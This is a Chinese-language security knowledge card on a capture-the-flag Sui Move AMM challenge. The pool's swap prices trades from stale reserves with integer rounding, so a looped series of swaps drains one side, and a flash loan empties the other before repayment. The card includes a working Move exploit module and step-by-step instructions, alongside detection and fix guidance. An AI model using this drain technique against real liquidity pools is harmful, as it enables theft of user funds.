---
id: blockchain-move-amm-swap-pre-reserve-rounding-drain
title: Move 恒定乘积 Swap 用旧储备且整数除法：循环兑换抽空单侧，闪贷后双侧归零
type: scenario
domain: blockchain
path: blockchain/move
technique: move-amm-swap-pre-reserve-rounding-drain
aliases:
- Sui AMM 取整攻击
- swap 旧储备
- 恒定乘积整数除法
- vault coin_a 归零
- Move flash get_flag
tags:
- blockchain
- move
- sui
- defi
- amm
- rounding
- flashloan
- integer-division
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:36+08:00'
  notes: 已对照原文核对；旧储备+取整序列与 exp 一致；未在链上复现
---

## 一句话结论

Move 恒定乘积 Swap 在存入输入币之前就用“旧储备”计算输出：`amount_out_B = coin::value(coina) * balance_b / balance_a`，且全程 `u64` 整数除法向下取整；攻击者用少量初始 A/B 反复 swap，可在若干轮后把 vault 的 A 侧抽到 0（后续用 B→A 把 A 拉回时又被取整放大），再调用闪贷把剩余 B 借走，使 `coin_a` 与 `coin_b` 同时为 0；`get_flag` 只检查两侧余额为 0，不检查 `flashed`/未还贷状态，因此先 `get_flag` 再还款即可。

## 原理

- **旧储备定价**：`swap_a_to_b(vault, coina)` 先读 `balance::value(&vault.coin_b)` 与 `balance::value(&vault.coin_a)`，用 `amount_in * reserve_b / reserve_a` 计算输出，然后才 `coin::put<A>` 把输入放进池子。输出没有使用“输入后的 reserve_a”，不符合恒定乘积公式 `Δy = Δx * y / (x + Δx)`；当 reserve_a 变小、reserve_b 相对变大时，输出被放大。
- **整数除法取整**：Move 没有浮点，`u64` 除法向下取整；每次 swap 都可能把小数部分“留给”池子或从池子拿走，重复操作可以系统性抽走一侧价值。原文的序列从 100/100 开始、用户持有 10A+10B：
  - 10A→B 得 10B（110/90）；
  - 10B→A 得 12A（98/100）；
  - 12A→B 得 12B（110/88），合并 B=22；
  - 22B→A 得 27A（83/110）；
  - 27A→B 得 35B（110/75）；
  - 35B→A 得 51A（59/110）；
  - 51A→B 得 95B（110/15）；
  - 拆 15B→A 得 110A（0/30）。
  此时 A 侧为 0、B 侧 30。
- **闪贷与 get_flag**：`flash(vault, 30, true, ctx)` 借走 B 侧 30，使 `coin_b` 也变为 0；`get_flag` 只断言 `balance::value(&vault.coin_a)==0 && balance::value(&vault.coin_b)==0`，不检查 `vault.flashed` 或回执是否已归还；因此可以在 `repay_flash` 之前先取 flag，事后再还贷（甚至不还）。
- **为什么可行**：AMM 的核心不变量是 `x*y=k` 不下降；旧储备公式 + 向下取整会让 k 变小，连续 swap 把价值从池子抽出；`get_flag` 缺少“无未结闪贷”的状态校验，使“借出→归零→取 flag”成为可能。

## 触发条件

- Swap 使用存入前的旧储备计算输出，且用 `u64` 整数除法向下取整。
- 池子同时支持 A/B 两种币种，攻击者有少量初始币（本题 10A+10B）即可启动循环。
- 存在 `flash` 闪贷函数，可在同一交易内借出剩余币种。
- `get_flag` 只检查两侧余额为 0，不检查 `flashed`、借款回执或还款状态。

## 利用步骤

1. 用初始 10A+10B 按原文序列反复 `swap_a_to_b`/`swap_b_to_a`，观察 vault 储备变化；目标是让 A 侧归零、B 侧剩余 30。
2. 关键 swap：`swap_a_to_b(51A)` 得 95B（池 110/15），拆出 15B 做 `swap_b_to_a` 得 110A（池 0/30）。
3. 调用 `flash(vault, 30, true, ctx)` 借走 30B，使池变为 0/0。
4. 立刻调用 `get_flag(vault, ctx)`；两侧余额均为 0，触发 Flag 事件。
5. 再调用 `repay_flash(vault, coin_a5, coin_b5, receipt)` 归还；把剩余的 110A、80B 转走。
6. 若需要重复，重开环境/池子重新执行序列。

## PoC

```move
module solve_task8::solve {
    use sui::coin::{Coin, join, split};
    use task8::vault::{Vault, flash, repay_flash, swap_a_to_b, swap_b_to_a, get_flag};

    public fun swap_rounds<A, B>(
        vault: &mut Vault<A, B>,
        our_10a: Coin<A>,
        our_10b: Coin<B>,
        ctx: &mut TxContext,
    ) {
        let coin_b = swap_a_to_b(vault, our_10a, ctx);       // 10A -> 10B, vault 110/90
        let coin_a = swap_b_to_a(vault, our_10b, ctx);       // 10B -> 12A, vault 98/100
        let mut coin_b2 = swap_a_to_b(vault, coin_a, ctx);   // 12A -> 12B, vault 110/88
        coin_b2.join(coin_b);                                // B=22
        let coin_a2 = swap_b_to_a(vault, coin_b2, ctx);      // 22B -> 27A, vault 83/110
        let coin_b3 = swap_a_to_b(vault, coin_a2, ctx);      // 27A -> 35B, vault 110/75
        let coin_a3 = swap_b_to_a(vault, coin_b3, ctx);      // 35B -> 51A, vault 59/110
        let mut coin_b4 = swap_a_to_b(vault, coin_a3, ctx);  // 51A -> 95B, vault 110/15
        let coin_b40 = coin_b4.split(15, ctx);
        let coin_a4 = swap_b_to_a(vault, coin_b40, ctx);     // 15B -> 110A, vault 0/30

        let (coin_a5, coin_b5, receipt) = flash(vault, 30, true, ctx); // vault 0/0
        get_flag(vault, ctx);                                          // 双侧为 0，先取 flag
        repay_flash(vault, coin_a5, coin_b5, receipt);                 // 再还款
        transfer::public_transfer(coin_a4, @0x0);
        transfer::public_transfer(coin_b4, @0x0);
    }
}
```

说明：PoC 为原文 week4_extra exp 的整理版，未在链上执行；原文通过该序列拿到 flag。原文修复方案采用 `Δy = Δx * y / (x + Δx)`（先存入输入、用 `reserve_a + in` 作分母）、`u128` 中间运算、输出不超过储备，并在 `get_flag` 增加 `!vault.flashed` 校验。

## 变体与关联

- 变体（定价错误）：用旧储备、先乘后除、`u64` 取整、缺少 `amount_out > 0`/`<= reserve` 检查；也可用捐赠抬高储备后套利。
- 变体（闪贷）：`get_flag` 不检查 `flashed`；`flash` 与 `repay` 可分离；回执未绑定币种（见闪贷类型混淆卡）。
- 变体（AMM）：首个 LP 通胀/捐赠抬价（见 DeFi 卡）；滑点/手续费取整；预言机价格操纵。
- 关联：[[blockchain-move-flashloan-receipt-type-confusion]]（闪贷回执绑定缺失）；[[blockchain-move-lending-position-cross-instance-collateral]]（DeFi 对象归属）；[[blockchain-defi-amm-first-lp-inflation-donation-rounding]]（AMM 取整/捐赠）；[[blockchain-defi-solana-auction-pda-reuse-bidder-state-vault-drain]]。
- 边界：若 swap 使用输入后储备、用 `u128` 并检查输出边界、`get_flag` 检查未结闪贷/还款状态，则该链不成立；池子初始储备/币种数量变化会影响具体序列。

## 检测与防御

- 检测（审计）：swap 是否在 `coin::put` 之前计算输出；分母是否包含输入；是否用 `u64` 乘除；`get_flag` 是否检查 `flashed`/回执；闪贷与还款是否原子。
- 防御：采用 `Δy = Δx * y / (x + Δx)` 并在存入输入后计算；用 `u128` 中间值、检查 `amount_out > 0`、`amount_out <= reserve`；保持 `x*y` 不下降（扣除手续费后）；`get_flag` 断言 `!vault.flashed` 且回执已消费；把 flash/repay 设计为同一函数/能力对象，未还款不能完成交易；用单元测试/Move Prover 验证不变量。
